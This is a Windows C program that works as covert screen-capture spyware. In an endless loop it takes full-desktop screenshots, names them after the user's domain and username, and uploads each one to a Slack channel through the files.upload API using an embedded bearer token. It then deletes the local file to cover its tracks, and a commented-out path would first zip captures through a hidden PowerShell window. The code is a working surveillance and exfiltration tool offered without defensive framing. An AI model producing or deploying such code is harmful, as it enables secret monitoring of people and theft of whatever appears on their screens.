#include <Windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <time.h>
#include <stdio.h>

#pragma comment(lib, "Wininet.lib")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

char pngPath[MAX_PATH];
char zipPath[MAX_PATH];
char combined[512];

// Generate DOMAIN_USERNAME--based file paths
BOOL GeneratePathsFromUser() {
    char username[256], domain[256];
    DWORD ulen = sizeof(username);
    DWORD dlen = sizeof(domain);

    if (!GetUserNameA(username, &ulen)) return FALSE;
    if (!GetEnvironmentVariableA("USERDOMAIN", domain, dlen)) return FALSE;

    snprintf(combined, sizeof(combined), "%s_%s", domain, username);
    return TRUE;
}
// not used, in case you want to send zip file instead
BOOL CompressToZip() {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "powershell.exe Compress-Archive -Path \"%s\" -DestinationPath \"%s\" -Force",
        pngPath, zipPath);

    printf("[*] Compressing to ZIP with PowerShell...\n");
    if ((int)ShellExecuteA(NULL, "open", "powershell.exe", cmd, NULL, SW_HIDE) > 32) {
        Sleep(3000); // wait for ZIP to finish
        return TRUE;
    }
    return FALSE;
}

BOOL SendZipToSlack(const char* token, const char* channel, const char* zipPath) {
    // Open an internet session
    HINTERNET hInternet = InternetOpenA("SlackUploaderFavoriteAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpenA failed: %lu\n", GetLastError());
        return FALSE;
    }

    // Connect to Slack
    HINTERNET hConnect = InternetConnectA(hInternet, "slack.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnectA failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Create multipart form-data body
    char boundary[] = "------------------------BOUNDARY123456";
    char headers[1024];
    sprintf(headers,
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Authorization: Bearer %s\r\n",
        boundary, token
    );

    // Read ZIP file into memory
    FILE* file = fopen(zipPath, "rb");
    if (!file) {
        printf("Failed to open ZIP file.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    fseek(file, 0, SEEK_END);
    DWORD fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    fread(fileBuffer, 1, fileSize, file);
    fclose(file);

    // Prepare form-data POST payload
    char startForm[512];
    snprintf(startForm, sizeof(startForm),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"channels\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/zip\r\n\r\n",
        boundary, channel, boundary, strrchr(zipPath, '\\') ? strrchr(zipPath, '\\') + 1 : zipPath);

    char endForm[128];
    snprintf(endForm, sizeof(endForm), "\r\n--%s--\r\n", boundary);

    DWORD totalSize = strlen(startForm) + fileSize + strlen(endForm);
    BYTE* postData = (BYTE*)malloc(totalSize);
    memcpy(postData, startForm, strlen(startForm));
    memcpy(postData + strlen(startForm), fileBuffer, fileSize);
    memcpy(postData + strlen(startForm) + fileSize, endForm, strlen(endForm));

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/files.upload", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        printf("HttpOpenRequestA failed: %lu\n", GetLastError());
        free(fileBuffer);
        free(postData);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Send the request
    BOOL result = HttpSendRequestA(hRequest, headers, strlen(headers), postData, totalSize);
    if (!result) {
        printf("HttpSendRequestA failed: %lu\n", GetLastError());
    }

    // Clean up
    free(fileBuffer);
    free(postData);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}


BOOL SendFileToSlack(const char* token, const char* channel, const char* filePath, const char* contentType) {
    HINTERNET hInternet = InternetOpenA("SlackUploaderFavoriteAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpenA failed: %lu\n", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, "slack.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnectA failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    char boundary[] = "----BOUNDARY123456";
    char headers[1024];
    sprintf(headers,
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Authorization: Bearer %s\r\n",
        boundary, token
    );

    FILE* file = fopen(filePath, "rb");
    if (!file) {
        printf("Failed to open file.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    fseek(file, 0, SEEK_END);
    DWORD fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    fread(fileBuffer, 1, fileSize, file);
    fclose(file);

    const char* filename = strrchr(filePath, '\\') ? strrchr(filePath, '\\') + 1 : filePath;

    char startForm[1024];
    snprintf(startForm, sizeof(startForm),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"channels\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: %s\r\n\r\n",
        boundary, channel, boundary, filename, contentType);

    char endForm[128];
    snprintf(endForm, sizeof(endForm), "\r\n--%s--\r\n", boundary);

    DWORD totalSize = strlen(startForm) + fileSize + strlen(endForm);
    BYTE* postData = (BYTE*)malloc(totalSize);
    memcpy(postData, startForm, strlen(startForm));
    memcpy(postData + strlen(startForm), fileBuffer, fileSize);
    memcpy(postData + strlen(startForm) + fileSize, endForm, strlen(endForm));

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/files.upload", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        printf("HttpOpenRequestA failed: %lu\n", GetLastError());
        free(fileBuffer);
        free(postData);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BOOL result = HttpSendRequestA(hRequest, headers, strlen(headers), postData, totalSize);
    if (!result) {
        printf("HttpSendRequestA failed: %lu\n", GetLastError());
    }

    // Cleanup
    free(fileBuffer);
    free(postData);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}



BOOL SaveBitmap(const wchar_t* wPath) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    BYTE* bBits = NULL;
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hBitmap = CreateCompatibleBitmap(hDC,
        GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN));
    hMemDC = CreateCompatibleDC(hDC);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0,
        GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN),
        hDC, x, y, SRCCOPY);

    bAllDesktops.bmWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    bAllDesktops.bmHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    bfHeader.bfType = 0x4D42;
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biWidth = bAllDesktops.bmWidth;
    biHeader.biHeight = bAllDesktops.bmHeight;

    bInfo.bmiHeader = biHeader;
    cbBits = ((bAllDesktops.bmWidth * 24 + 31) / 32) * 4 * bAllDesktops.bmHeight;
    bBits = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBits);

    GetDIBits(hMemDC, hBitmap, 0, bAllDesktops.bmHeight, bBits, &bInfo, DIB_RGB_COLORS);

    hFile = CreateFileW(wPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

    CloseHandle(hFile);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);
    HeapFree(GetProcessHeap(), 0, bBits);

    return TRUE;
}

int main() {

    const char* slackToken = "<SLACK_TOKEN>";
    const char* slackChannel = "#<CHANNEL_NAME>";

    if (!GeneratePathsFromUser()) {
        printf("[-] Failed to generate filename paths.\n");
        return 1;
    }

    printf("[*] Monitoring for screenshots...\n");

    while (TRUE) {

        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        char timeStamp[64];
        strftime(timeStamp, sizeof(timeStamp), "%Y-%m-%d_%H-%M-%S", t);
        
        snprintf(pngPath, MAX_PATH, "C:\\Users\\Public\\%s_%s.png", combined, timeStamp);
        snprintf(zipPath, MAX_PATH, "C:\\Users\\Public\\%s_%s.zip", combined, timeStamp);

        wchar_t pngPathW[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, pngPath, -1, pngPathW, MAX_PATH);

        if (SaveBitmap(pngPathW)) {
            printf("[+] Screenshot saved.\n");
            /*
            if (CompressToZip()) 
                if (SendZipToSlack(slackToken, slackChannel, zipPath)) {
                    printf("[+] ZIP uploaded to Slack!\n\n");
                    printf("[*] CleanUP screenshot & zip\n");
                    if (DeleteFileA(pngPath)) {
                        printf("[+] %s deleted.\n", pngPath);
                    }
                    if (DeleteFileA(zipPath)) {
                        printf("[+] %s deleted.\n", pngPath);
                    }

                }
                else {
                    printf("[-] Upload failed.\n");
                }
            }
            */

            if (SendFileToSlack(slackToken, slackChannel, pngPath, "image/png")) {
                printf("[+] PNG uploaded to Slack!\n\n");
                printf("[*] Cleaning up PNG\n");
                if (DeleteFileA(pngPath)) {
                    printf("[+] %s deleted.\n", pngPath);
                }
            }
            else {
                printf("[-] PNG upload failed.\n");
            }

        }
        else {
            printf("[-] Screenshot failed.\n");
        }

        Sleep(10000); // 1 minute
    }

    return 0;
}
